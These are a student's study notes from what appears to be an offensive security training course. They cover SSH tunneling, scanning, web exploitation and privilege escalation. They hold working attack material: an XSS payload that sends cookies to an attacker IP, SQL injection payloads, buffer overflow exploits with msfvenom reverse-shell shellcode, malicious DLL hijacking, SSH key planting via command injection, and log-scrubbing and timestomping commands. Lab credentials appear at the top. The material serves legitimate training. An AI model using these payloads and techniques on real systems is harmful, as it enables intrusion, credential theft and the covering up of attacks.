linops: 10.50.36.204
Winops: 10.50.34.195
un: LUMC-502-M
pw: FICkFYNeOmskl07	
stack: 19
ip: 10.50.38.134
xfreerdp /u:student /v:10.50.34.195 /dynamic-resolution +glyph-cache +clipboard (use this command to get into the system)

## New tunneling method
facility
    ssh -MS /tmp/grey student@10.50.25.150 
    **creates a socket in the /tmp directory that hosts info from that IP**
    **to get rid of this, ssh -MS /tmp/grey -O cancel student@10.50.25.150**
    
    ssh -S /tmp/grey dummy -O forward -D9050
    **creates a local forwarder**
    **to get rid of this, ssh -S /tmp/grey dummy -O cancel -D9050**

    ssh -S /tmp/grey dummy -O forward -L1111:192.168.128.100:80
    **creates a local portforward to that ip on port 80**

    ssh -S /tmp/grey dummy -O forward -L1111:192.168.128.100:80 -L2222:192.168.128.100:22
    **if you saw did scans and saw that the .100 had 22, tac on another port forward to ssh**

    netstat -natup **to see if your tunnels worked**
    history **if you've forgotten what ya did.**
    
    
## Penetration Testing

    testing a network for vulnerabilities and shit.

    PHASE 1: Mission Definition
        define mission goals and targets
        determine scope of mission
        define ROE
    PHASE 2: Recon
        information gathering about the target through public resources.
    PHASE 3: Footprinting
        accumulate data through scanning and/or interaction with the target/target resources.
    PHASE 4: Exploitation and initial access
        gain an initial foothold on network
    PHASE 5: Post-exploitation
        establish persistence
        escalate privileges
        cover your tracks
        exfiltrate target data
    PHASE 6: document mission
        document and report mission details

        
    Pen test reporting:
        executive summary
        technical summary
        reasons to report
        what to report
        screen captures

## Reconnaissance & Scanning
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/02-network-scanning-and-recon.html

    OSINT data to collect:
        web data
        sensitive data
        publicly accessible
        social media
        domain and IP data

    Hyper-Text Markup Language (HTML)
        client-side interpretation (web browser)
        utilizes elements (identified by tags)
        typically redirects to another page for server-side interaction
        cascading stylesheets (CSS) for page themeing.

    Scraping data:
        **prep**: pip install lxml requests

        **script: htmlscraping.py**
        #!/usr/bin/python
        import lxml.html
        import requests
        
        page = requests.get('http://quotes.toscrape.com')
        tree = lxml.html.fromstring(page.content)
        
        authors = tree.xpath('//small[@class="author"]/text()')
        
        print ('Authors: ',authors)

    **Advanced scanning techniques:**
    1. HOST DISCOVERY
        find hosts that are online / use ruby ping sweep. for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
        
    2. PORT ENUMERATION
        find ports for each host that is online / ensure dynamic tunnel is open.
        use proxychains nmap -T5 <ip>  
        
    3. PORT INTERROGATION
        find what service is running on each open/available port.
        proxychains nc <ip> <port#> ((to ensure port is what it says it is))

        **NMAP SCRIPTS LOCATION**
        /usr/share/nmap/scripts
        ex: proxychains nmap --script http-enum 192.168.28.100
        ex: proxychains nmap --script banner 192.168.28.100

        **other useful**
        nmap --script <filename>|<category>|<directory>
        nmap --script-help "ftp-* and discovery"
        nmap --script-args <args>
        nmap --script-args-file <filename>
        nmap --script-help <filename>|<category>|<directory>
        nmap --script-trace

## Vulnerability and Exploitation Research
https://sec.cybbh.io/public/security/latest/lessons/lesson-3-research_sg.html
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/03-exploitation-research-slides.html

        Initial access:
            getting a foothold onto the system. Phishing is the most common method.

        exploit research:
            Transition from reconnaissance to weaponization
            Leverage intelligence/data about network
            Pair vulnerabilities to exploits
            Align exploits to operational objectives
            https://www.exploit-db.com/
            nvd.nist.gov

## Web Exploitation Day 1:
https://sec.cybbh.io/-/public/-/jobs/866153/artifacts/slides/04-web-exploitation.html

    **Server/Client Relationship**
    Synchronous communications between user and services
    Not all data is not returned, client only receives what is allowed

    **Hyper-Text Transfer Protocol (HTTP)**
    Request/Response
        Various tools to view:
            tcpdump
            wireshark
            developer console
            
    **HTTP Methods**
        GET
        POST
        HEAD
        PUT
        https://tools.ietf.org/html/rfc2616

     **HTTP Response Codes**
        10X == Informational
        2XX == Success
        30X == Redirection
        4XX == Client Error
        5XX == Server Error

    **HTTP Fields**
        User-Agent
        Referer
        Cookie
        Date
        Server
        Set-Cookie

    **Wget**
    Recursively download
    Recover from broken transfers
    SSL/TLS support

    **JavaScript (JS)**
    Allows websites to interact with the client
    JavaScript runs on the client’s machine
    Coded as .JS files, or in-line of HTML

    **Enumeration**
    ROBOTS.TXT
    Legitimate surfing
    Tools:
        NSE scripts
        Nikto
        Burp suite (outside class)

    **Cross-Site Scripting (XSS) Overview**
    Insertion of arbitrary code into a webpage, that executes in the browser of visitors
    Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
    Often found in forums that allow HTML

    **Stored XSS**
    Resides on vulnerable site
    Only requires user to visit page
    <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

    **Reflected XSS**
    Most common form of XSS
    Transient, occurs in error messages or search results
    Delivered through intermediate media, such as a link in an email
    Characters that are normally illegal in URLs can be Base64 encoded
    
    Below is what you see, but the server will decode as name=abc123
    http://example.com/page.php?name=dXNlcjEyMw

    **Useful JavaScript Components**
        Proof of concept (simple alert):
            <script>alert('XSS');</script>

        Capturing Cookies
            document.cookie
        Capturing Keystrokes
            bind KEYDOWN and KEYUP
        Capturing Sensitive Data
            document.body.innerHTML

     **host http server**       
    python3 -m http.server

    **malicious java script with linops ip**
    <script>document.location="http://10.50.36.204:8000/"+document.cookie;</script>

    **Server-Side injection**
    Directory Traversal/Path Traversal
    Ability to read/execute outside web server’s directory
    Uses ../../ (relative paths) in manipulating a server-side file path
    ex: view_image.php?file=../../etc/passwd
    ex: use a bunch of ../../../../../etc/passwd (if you don't know where ya are)
    ex: ../../../../etc/hosts (view ip addresses -> names)((flags, areas to pivot etc)

    **Malicious File Upload**
    Site allows unsanitized file uploads
    https://sec.cybbh.io/public/security/latest/lessons/lesson-4-        xss_sg.html#_demo_malicious_file_upload
    Server doesn’t validate extension or size
    Allows for code execution (shell)
    Once uploaded
        Find your file
        Call your file

    **Command Injection**
    Application on the server is vulnerable,
    allowing execution of arbitrary commands

    User input not validated
        Common example is a SOHO router, with a web page to allow ping

    Run the following to chain/stack our arbitrary command
        ; cat /etc/passwd

## SSH Key upload 
        check /etc/passwd for interactive shell
        generate an ssh key. 
        ls -la (.ssh folder is hidden)
        ssh-keygen -t rsa -b 4096 -> hit enter x2
        file id_rsa (private key)
        file id_rsa.pub (public key)
        from webserver command injection -> ;mkdir /var/www/.ssh
        then -> ; ls -la /var/www (to check if you made the file)
        then -> ; echo "" > /var/www/.ssh/authorized_keys (paste your public key between quotes)
        to check -> ; cat /var/www/.ssh/authorized_keys
        then -> ssh to it. ssh www-data@10.50.30.162

    **to ssh with someones private key**
        ssh -i id_rsa www-data@10.50.30.162 (to use a specific private key, replace 'id_rsa' with whatever you saved it as)

## Web Exploitation Day 2
https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-slides.html

    SQL
    S tructured Q uery L anguage - ANSI Standard
    Additional commands added by vendors
    Relational

    Standard Commands (SQL)
    SELECT - Extracts data from a database
    UNION - Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
    USE - Selects the DB to use
    UPDATE - Updates data in a database
    DELETE - Deletes data from a database
    INSERT INTO - Inserts new data into a database
    CREATE DATABASE - Creates a new database
    ALTER DATABASE - Modifies a database
    CREATE TABLE - Creates a new table
    ALTER TABLE - Modifies a table
    DROP TABLE - Deletes a table
    CREATE INDEX - Creates an index (search key)
    DROP INDEX - Deletes an index

    **default SQL databases** - to view -> mysql -> show databases; 
    information_schema
    mysql
    performance_schema
    session (not default)

    *to see tables in SQL*
    ex:
    show TABLES FROM session
    Tires
    car

    *to see columns in a table*
    ex:
    show columns from session.Tires;
    show columns from session.car;

    **see information in the columns**
    select tireid,name,cost,size session.Tires;
    select year,name,cost from session.car;

    **use union to combine outputs**
    ex:
    select year,name,cost from session.car UNION select name,size,cost from session.Tires;

    **SQL Injection - Considerations**
    Requires Valid SQL Queries
    Fully patched systems can be vulnerable due to misconfiguration
    Input Field Sanitization
    String vs Integer Values
    Is INFORMATION_SCHEMA Database available?
    GET Request versus POST Request HTTP methods

    **Unsanitized vs Sanitized Fields**
    Unsanitized: input fields can be found using a Single Quote ⇒ '
        Will return extraneous information
        ' closes a variable, to allow for additional statements/clauses
        May show no errors or generic error (harder Injection)

    Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
    Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')

    Example - Injecting Your Statement -> do this if you see a login box. (use ; in front of your commands)
    User enters TOM' OR 1='1 in the name and pass fields
    Truth Statement: tom' OR 1='1
    Server-Side query executed would appear like this:
    SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’

    **change this from a post to a get using developer tools**
    1. open network tab, send the credentials again
    2. hit the request tab on the right hand side
    3. set a value in the url -> set the value in the request field to raw
    4. copy and paste that value into the url with a ? after the php
    5. view page source

## SQL on database POST Method
    http://10.50.28.178/Union.html
    Ford
    Dodge
    Honda
    Audi
    
    Audi' OR 1='1 -> ends up showing full table.
    now we can try using union -> Audi' Union select 1,2,3,4,5 #
        You're guessing the numbers in union select until you see the table displayed properly.
    UNION select <column>,<column>,<column> FROM <Databases>.<Tables>
    table_schema = Databases names
    table_name = Tables names
    column_name = Columns names

    "Golden statement" -> Audi' Union select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
    (this shows the entire database pretty much)

    If we wanted to view something specific (cost of a car)
    Audi' Union select name,2,cost,type,color FROM session.car #
    ex 2:
    Audi' Union select id,2,name,pass,5 FROM session.user #

## SQL on database GET Method
    ex for this one is selecting something from a dropdown menu
    Pay attention to URL bar, it should change for each selection

    http://10.50.28.178/uniondemo.php?Selection=1&Submit=Submit

    http://10.50.28.178/uniondemo.php?Selection=2 OR 1=1 
    Above, you're selecting something, then adding a boolean condition to true at the end and testing each one.

    Next -> use union to see how many columns are Available.
    http://10.50.28.178/uniondemo.php?Selection=2 UNION select 1,2,3
    
    then "Golden statement" ->
    http://10.50.28.178/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name FROM information_schema.columns

    final to view something specific ->
    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select studentID,username,passwd FROM session.userinfo 
    ex 2:
    ttp://10.50.28.178/uniondemo.php?Selection=2 UNION select session_id,user_id,remote_ip FROM session.session_log

    **To find a version of SQL server**
    UNION select 1,2,@@version

## Reverse Engineering
https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/06-reverse-engineering.html

    **X86_64 Assembly**
        16 general purpose 64-bit registers.
        %rax - the first return register
        %rbp - the base pointer that keeps track of the base of the stack
        %rsp - the stack pointer that points to the top of the stack

            You will see arguments passed to functions as something like: [%ebp-0x8]

        **X86_64 Assembly - Common Terms**
        HEAP - Memory that can be allocated and deallocated
        STACK - A contiguous section of memory used for passing arguments
        GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
        CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
        FLAGS REGISTER - Contains the current state of the processor

        **There is one instruction pointer register that points to the memory offset of the next instruction in the code segment:**
        64 bit    lower 32 bits    lower 16 bits    description
        RIP        EIP              IP              instruction point; holds address
                                                    for next instruction to be run.

        **X86_64 Assembly - Common Instruction Pointers**
        MOV - move source to destination
        PUSH - push source onto stack
        POP - Pop top of stack to destination
        INC - Increment source by 1
        DEC - Decrement source by 1
        ADD - Add source to destination
        SUB - Subtract source from destination
        CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
        JMP - Jump to specified location
        JLE - Jump if less than or equal
        JE - Jump if equal (uses %RFLAGS register, relies on zero flag)

    **DEMO1**
        1.main:
        2.    mov rax, 16 (#16 moved into rax)
        3.    push rax (#push value of rax (16) onto stack)
        4.    jmp mem2
        5.
        6.mem1:
        7.    mov rax, 0 (move 0 (error free) exit code to rax)
        8.    ret (return out of code)
        9.
        10.mem2:
        11.    pop r8 (# pop value on the stack (16)into r8.)
        12.    cmp rax, r8 (#compare rax register value (16) to r8 register value (16)
        13.    je mem1
        
    **DEMO2**
        1.main:
        2.    mov rcx, 25 (store the value 25 in rcx register)
        3.    mov rbx, 62 (store the value of 62 in rbx register)
        4.    jmp mem1
        5.
        6.mem1:
        7.    sub rbx, 40 (subtract 40 from rbx(22)
        8.    mov rsi, rbx (copy rbx value (22) to rsi)
        9.    cmp rcx, rsi (compare values in rcx and rsi)
        10.   jmple mem2 (jump if less than equal)
        11.
        12.mem2:
        13.    mov rax, 0 (store 0 (error free/success) in rax)
        14.    ret

## Reverse Engineering Workflow (Software)
    file:///home/luke.a.mcghee55/Desktop/Reverse_engineering_workflow.pdf
    **static**
        1. Determine file type - Is it an executable? What environment is it designed to run in? (OS,cpu
        architecture, etc)
        2. Determine if file is packed/compressed (UPX)
        3. Find plain text ascii and unicode strings
        4. View imports/exports to get a hint of functionality/calls (is it importing a library that can open a
        socket, etc?)
        5. Look for encrypted sections of the binary
        
    **behavioral**
        1. Take a snapshot of the analysis environment - Important! Taking a snapshot on an OpenStack
        VM takes a substantial amount of time.
        2. Take a snapshot of critical configurations of the analysis environment. (Things like the registry,
        important directories, etc)
        3. Launch realtime analysis tools (Things like procmon and fakenet)
        4. Execute and interact with the object/binary while taking note of observations.
        5. Stop the binary and view how it affected critical configurations (registry, files, etc) by
        comparing to previous snapshots
        6. Analyze results of realtime analysis tools (did fakenet catch network calls, did procmon show it
        writing to a file, etc)
    
    **dynamic**
        1. Execute binary in a debugger
        2. Step through binary, setting breakpoints as approriate
        3. Continuously rerun the binary and edit it’s parameters through the debugger, as you learn
        more about how it works
        4. Document all observations and modifications
        
    **disassembly**
        1. Disassemble binary in IDA, Ghidra, or other disassembler
        2. Use notes to find artifacts within the disassembly
        3. Find a good spot to work from within the binary. Then quickly browse from the top to the
        bottom of the disassembly to view the overall flow of the disassembly
        4. Rename variables and functions as appropriate when quickly scanning top to bottom of the
        disassembly.
        5. Work your way from the bottom to the top - if there are two outcomes choose the one you want
        to end at, then work your way up from there to determine what needs to happen for the
        program to flow to the desired outcome.
        
    **document findings**
        1. Document all discovered binary traits, capabilities, and behaviors to include the conditions they must run under.
        2. Document potential uses for the binary.
        3. Create mitigations for the binary if it is malicious.
        4. Create signatures and indicators of compromise to detect the binary in the future.
        5. Document and save the tools, scripts, code, methods used to analyze the software to better
            analyze related software in the future.
        6. Document proof of concept for exploitation of the binary if it is found to be vulnerable and a potential target. For example, if the binary is running on an adversary network, or if a friendly network may be using the binary.

## Portable Executable Patching / Software Analysis

    Perform DEBUGGING and DISASSEMBLY
    Find the SUCCESS/FAILURE
    Adjust INSTRUCTIONS
    Apply Patch and Save
    Execute Patched Binary

## Patching demo

    open in Ghidra as normal -> search strings, find function etc.
    check left side, and start looking through instructions
    in this demo, 13555 is what the function was looking for to print success
    CPM     EAX,13555 is visible on the left pane
    Right click 13555 -> patch instruction -> change to EAX,EAX (this will compare user input to user input and return true *returning success*)
    export program -> change to PE (if its a .exe/or on windows)
    

## reverse engineering workflow

    if windows:
        check properties, details, etc
        interact w/ program
        check source code if you have it
        atoi - takes a string and turns it into an integer
        if you don't have source code, open Ghidra -> open the executable in ghidra
        analyse the code, search for strings if you have some

## Exploit Development
https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html

    **Buffer Overflow Common Terms**
        HEAP - Memory that can be allocated and deallocated
        STACK - A contiguous section of memory used for passing arguments
        REGISTERS - Storage elements as close as possible to the central processing unit (CPU)
        INSTRUCTION POINTER (IP) - a.k.a Program Counter (PC), contains the address of next instruction to be executed
        STACK POINTER (SP) - Contains the address of the next available space on the stack
        BASE POINTER (BP) - The base of the stack
        FUNCTION - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
        SHELLCODE - The code that is executed once an exploit successfully takes advantage of a vulnerability

       **Buffer Overflow Defenses**
            Non executable (NX) stack
            Address Space Layout Randomization (ASLR)
            Data Execution Prevention (DEP)
            Stack Canaries
            Position Independent Executable (PIE)

    **GDB Uses**
        disass <FUNCTION>   #   Disassemble portion of the program
        info <...>  #   Supply info for specific stack areas
        x/256c $<REGISTER>  #   Read characters from specific register
        break <address>  #   Establish a break point

## Web Exploitation Demo

    1. ensure its saved in /home/student
    2. chmod u+x it
    3. run file on it, run strings on it
    4. ./func (or whatever its name is) to run it
    5. ./func $(echo "sdflkjsdflkjsdfflksjdflksjdf") see if it takes arguments
    6. ./func <<<$(echo "sdflkjsdflkjsdfflksjdflksjdf") Takes the output of the echo command and redirects it as input into the executable.
    7. enter a lot more characters to see if we get something
    8. create python script (lin_buf.py)
        #!/usr/bin/env python
        buffer = "A" * 40 
        print(buffer)
        
    9. ./func <<<$(./lin_buf.py)
    10. increase chars in script until segmentation fault
    11. then run 'gdb ./func'
    12. run - allows you to run it the exe in gdb. info functions - shows you functions in the program. disass main - to see main function. pdisass main (to see it more better)
    13. in gdb -> run <<<$(./lin_buf.py)
    https://wiremask.eu/tools/buffer-overflow-pattern-generator/
    14. copy the value in wiremask, do run<<<$(echo "value")
    15. copy the value in the instruction pointer.
    16. go back to wiremask, paste that offset in the register value. (this should tell you the amount of characters you need to send in the script)
    17. note the offset value, go back into script and change your buffer to that number.
    18. create eip in your script -> eip = "B" * 4 -> print(buffer+eip)
    19 in gdp -> run <<<$(./lin_buf.py)
    20. quit out of GDB. reenter gdb with 'env - gdb ./func' -> then show env -> need to get rid of these environmental variables. run 'unset env COLUMNS / LINES'
    21. run the executable again to get it to crash in order to figure out locations of ESP / or run normally and interupt with ctrl c
    22. enter a bunch of stuff 
    23. then run 'info proc map' shows processes memory mapping. location of heap/stack/text of executable
    24. the start is the startaddr right below the heap. the end is the end addr of the stack.
    25. then in gdb run 'find /b 0xf7de1000 0xffffe000, 0xff, 0xe4'
    0xff = hex for jump, 0xe4 is hex for esp
    26. copy and paste a couple of those into the python script.
    27. put em in little endian ex: 0xf7de3b59 -> "\x59\x3b\xde\f7" -> save that
    28. open new console -> msfdb init (to initialize metasploit) -> msfconsole to run
    29. use payload/linux/x86/exec -> show options
    30. set CMD whoami && ifconfig -> show options again (just to verify if it works)
    31. generate -b '\x00\' -f python (this generates byte code) 
    32. copy the byte code -> paste it all into your python script
    33. add a no op sled to your python script 'nop = "\x90" * 10'
    34. change eip to the little endian of your first stack location.
    35. change print statement to include nop and buf
    36. then go to linops terminal and run -> ./func <<<$(./lin_buf.py)

    (if it doesnt work, regenerate shell code, change EIP, check print statement, make sure you're just using 'python' , on target machine -> put this in /tmp)

    **MSFvenom one liner** 'msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python

    SCP through a tunnel syntax 
    scp -P 1111 lin_buf1.py comrade@127.0.0.1:/home/comrade
    
    
## Windows Buffer Overflow
https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b

    1. attempt to run malware
    2. nmap -Pn -sT -T5 --script=banner 10.50.34.195 (from linops to see what ports opened on winops)
    3. 9999 was open, so we used nc '10.50.34.195 9999'
    4. made win_buf.py script to interact w/ ip and port 9999
    5. go back to winops, open immunity -> file -> attach -> attach the .exe, just pay attention to the cpu thread window here.
    6. click the play button in the top left -> send your script again.
    7. find out how many bytes we have to send to overwrite it -> modify buf in script to vulnerable command, add 'buf += "A" * 100', keep modifying the 100 value until it breaks.
    8. once broken, go into wiremask and copy the value you used into length. -> then copy and paste the pattern into your script in the buf += part.
    9. run the script with the new buf, copy and paste the EIP as the register value in wiremask to find the offset.
    10. go back into your script. delete the pattern you put in buf +=, and add the offset value you got from wiremask.
    11. add another buf += "B" * 4 -> sen script, check new EIP to see if it worked.
    12. if its broken, rewind and hit play again. type !mona modules at the bottom. -> then run !mona jmp -r esp -m "essfunc.dll" -> click l at the top if it goes away.
    13. go down to where you see your command, copy and paste the address of the first result. -> add that jmp esp to your exploit (you're replacing the "B" with this in little endian)
    14. then below that line, add buf += "\x90" * 15
    15. then on linops -> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.36.204 lport=10000 -b "\x00" -f python (the lhost is linops ip)
    16. The command above generates shellcode, do not take the first line.
    17. go back into msfconsole -> use multi/handler -> show options -> set payload windows/meterpreter/reverse_tcp -> set LHOST 0.0.0.0 -> set LPORT 10000 (change the LPORT to whatever you used in msfvenom)
    18. ensure the malware is running on winops -> type 'exploit' on msfconsole -> then run your script in another window 'python win_buf.py) -> this should give you a shell on the victim device. -> type help to look for commands.
    
    
    
## Post Exploitation
https://sec.cybbh.io/public/security/latest/lessons/lesson-8-post_sg.html

     **SSH Overview**
        Access remote systems using an SSH server as a proxy
        Securely transfer files
        Execute commands on a remote system
        VPN using the SSH protocol as a transport
        Forwarding the X Window System display to the client system

    **Linux Targets**
        local port fwd:
            -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
        remote port fwd:
            ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT

    **SSH Keys**
        SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password
        If you are able to find a users private ssh key it can potentially be used to gain access to other systems

    **Using Stolen SSH Keys**
    Bring private key to your own box
    On your box:
        chmod 600 /home/student/stolenkey
        ssh -i /home/student/stolenkey jane@1.2.3.4

    **Control Sockets**
    benefits provided include:
        multiplexing
        data exfiltration
        less logging

    **Control Sockets (config)**
        command line method:
            ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
            ssh -S /tmp/s x@x
            scp -o 'ControlPath=/tmp/s' x@x:<Path>
        Configuration File Method (~/.ssh/ssh_config)
            HostName *
            ControlPath ~/.ssh/controlmasters/%r@%h:%p
            ControlMaster auto
            ControlPersist 10m

    **Local host enumeration**
        windows: net user
        linux: cat /etc/passwd | cat /etc/hosts (first thing you do on linux box/name resolution)
        linux: /etc/crontab(system created) | /var/spool/cron/crontabs (user created)

        Process enumeration:
            win: tasklist /v
            linux: ps -elf

        Service enumeration:
            win: tasklist /svc
            linux: chkconfig
                    systemctl --type=service
            ps -p 1 (tell the diff between systemd and sysV | init = sysV, or systemd
        
        Network Connection Enumeration
            win: ipconfig /all
            linux: ifconfig -a or ip a

    **SCP help**
    scp <source> <destination> 
    
    ## from local to remote
    scp file user@10.10.10.10:/path/to/file 
    
    ## scp through a tunnel (sending file.txt to our working directory)
    scp -P 1111 user@127.0.0.1:/path/to/file.txt .

##Privilege Escalation, Persistence & Covering Your Tracks
Windows
https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/09-windows-priv-persist-cover.html

    **Modes & Levels**
        Kernel Mode vs User Mode
        Privileged vs Unprivileged

    **Windows Access Control Model**
    Access Tokens
        Security Identifier (SID) associations and Token associations
    Security Descriptors -> identify who did what using SIDs
        DACL
        SACL
        ACEs

    **DLL Search Order**
    Executables check the following locations (in successive order):

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    The directory the the Application was run from *** important ***
    The directory specified in in the C+ function GetSystemDirectory()
    The directory specified in the C+ function GetWindowsDirectory()
    The current directory

    **Windows Integrity Mechanism**
    Integrity Levels
        UNTRUSTED - Anonymous SID access tokens
        LOW - Everyone SID access token (World)
        MEDIUM - Authenticated Users
        HIGH - Administrators
        SYSTEM - System services (LocalSystem, LocalService, NetworkService)

    **User Account Control (UAC)**
    Always Notify
    Notify me only when programs try to make changes to my computer
    Notify me only when programs try to make changes to my computer (do not dim my desktop)
    Never notify

    **DEMO: Checking UAC Settings**
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

    **AutoElevate Executables**
    Requested Execution Levels:
        asInvoker
        highestAvailable

    **Scheduled Tasks & Services**
    Items to evaluate include:
        Write Permissions
        Non-Standard Locations
        Unquoted Executable Paths
        Vulnerabilities in Executables
        Permissions to Run As SYSTEM

    **DEMO: Finding vulnerable Scheduled Tasks**
    schtasks /query /fo LIST /v
##    DEMO: DLL Hijacking
    Identify Vulnerability
    Take advantage of the default search order for DLLS
    NAME_NOT_FOUND present in executable’s system calls
    Validate permissions
    Create and transfer Malicious DLL

    step by step:
       1. check services! (weird locations, strange naming, lack of description etc.)
        2. double click service, check name, description, check path 
        3. go to the path of the executable in file explorer -> attempt to write something to the directory, (just create text file) if you can, this means you can put a DLL in there. **also try to rename executable**
        4. open sysinternals, run procmon to see what DLL's the .exe uses.
        5. procmon filter processname contains .dll & process name contains (.exe)
        & result is NAME NOT FOUND
        6. then run the executable -> take note of dll's found
        7. open linops -> create msfvenom command -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
        8. go back to windows on powershell -> scp that file you just created from linops back to windows ->  scp student@10.50.36.204:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty\SSPICLI.DLL" 
        9. run the executable -> with this msfvenom command, this should drop a text file with the contents of your command on the desktop.

## Demo renaming / writing (EXE replacement) if you can rename, use exe replacement.
    1. rename the .exe file to something else.
    2. go to linops and craft ya payload -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f exe > putty.exe
    3. scp this back to the target box. -> scp student@10.50.36.204:/home/student/putty.exe "C:\Program Files (x86)\Putty\putty.exe"
    4. then run the executable.
        
        
## DEMO: Finding Vulnerable Services

    wmic service list full
    sc query        
## Other Vulnerabilities
    unpatched kernel vulnerabilities
    unpatched systems
    unpatched applications
##    DEMO: Audit Logging
    Show all audit category settings
        auditpol /get /category:*
        auditpol /get /category:* | findstr /i "success failure" (for what is being audited)
## Important Microsoft Event IDs
    4624/4625 - successful/ failed login
    4720 - account created
    4672 - administrative user logged on
    7045 - service created

## get sys internals tools
    net use z: "\\http://live.sysinternals.com" /persistent:yes 
    
    msfvenom to copy contents of desktop -> msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\comrade.WIN2-INTERNAL-D\Desktop\ /s"' -f dll > hijackmeplz.dll


## Linux Exploitation / Privilege escalation
https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.html

    **Objectives**
    Adding or hijacking a user account
    Implementing boot process persistence
    Adding or modifying a CRON job
    Additional methods outside the scope of the SG

    **Privilege escalation**
    **run sudo -l** when ya get on a box to see what you can run.
    **can escalate** opening sudo vim /etc/ssh/sshd_config, then :!sh to gain root access. (that file is an example, can be any file you can sudo vim into.)
    can do the same thing as above w "sudo less /etc/ssh/sshd_config"
    more examples of these at: https://gtfobins.github.io/

    **Sudo file config** -> in /etc/sudoers
    %sudo ALL=(ALL:ALL) ALL -> on all hosts, anyone in this group / user can sudo as all users and all groups to execute all commands. % means its a group, no % is user.
    ex:
    murphy ALL=/usr/bin/halt,/usr/bin/poweroff,/usr/bin/reboot
    This rule allows user murphy to run /usr/bin/halt, /usr/bin/poweroff and /usr/bin/reboot as root.

    **SUID/SGID** -> for the user or group that owns the file. 
    ls -l /usr/bin/passwd
    -rwsr-xr-x 1 root root 59640 Nov 29  2022 /usr/bin/passwd
    This has the SUID bit turned on. 

    Find all files w/ the SUID bit turned on:
        find / -type f -perm /4000 -ls 2>/dev/null

    Find all files w/ the SGID bit turned on:
        find / -type f -perm /2000 -ls 2>/dev/null

    Find all files w/ SUID & SGID turned on:
        find / -type f -perm /6000 -ls 2>/dev/null

    Check what is returned against GTFObins to see what you can exploit. 

    **Insecure Permissions**
    CRON
    World-Writable Files and Directories
    Dot '.' in PATH

    **CRON**
    /etc/cron.d .daily, .hourly .weekly .monthly .weekly (etc ones are system level crons)
    /var/spool/cron/crontabs/student (or whoever created it) -> user created crons.
    -e to edit crontab, -l to list crontab, -u specify the user, -r remove crontab
    crontab.guru to check cron job times. ex: crontab -e

    **World-Writable Files and Folders** -> file that anyone can write into
    ex: /tmp & /var/tmp

    World writable files and directories can be identified with the following command:
        find / -type f -perm /2 -o -type d -perm /2 2>/dev/null # Search for any file or directory that is writable by the context "other" 

    To find files and directories that you have the ability to write to, use the command:
    find / -type f -writable -o -type d -writable 2>/dev/null

    demo: find / -type f -o -type d -perm /2 2>/dev/null (find writable files)
    demo: find / -type d -perm /2 2>/dev/null (just finds writable directories)

    **Dot '.' in PATH**
    echo $PATH

    **Vulnerable Software and Services**

    **Persistence**
    
    **Adding or Hijacking a User Account**
    
    **Covering your tracks**
    Artifacts - anything youll leave behind.
    logs/users/opening files etc.
    unset HISTFILE

    Check init type -> ps -p 1

    **Logs for Covering Tracks** -> run ls -latr for these guys.
    logs typically housed in /var/log & useful logs:       
    auth.log/secure - Logins/authentications
    lastlog - Each users' last successful login time
    btmp - Bad login attempts
    sulog - Usage of SU command
    utmp - Currently logged in users (W command)
    wtmp - Permanent record on user on/off

    **Cleaning The Logs**
    Before we start cleaning, save the INODE!
    Affect on the inode of using mv VS cp VS cat
    Know what we are removing (Entry times? IP? Whole file? Etc.)

    **Cleaning The Logs (Precise)**
    GREP (remove):
        egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

    SED (replace):
        cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

    **Timestomp (Nix)**
    touch -c -t 201603051015 1.txt   # Explicit
    touch -r 3.txt 1.txt    # Reference

    **Remote Logging**
    Main one is RSYSLOG -> check the config file in order to indentify where logs are being sent, and which ones are being sent.

    Rsyslog -> newer rsyslog references /etc/rsyslog.d/* for settings/rules
    older version only uses /etc/rsyslog.conf
    ex:
        kern.*                                                # All kernel messages, all severities
        mail.crit
        cron.!info,!debug
        *.*  @192.168.10.254:514     (1 @ = udp, 2 @@'s = tcp)                       # Old format
        *.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
        #mail.*
    
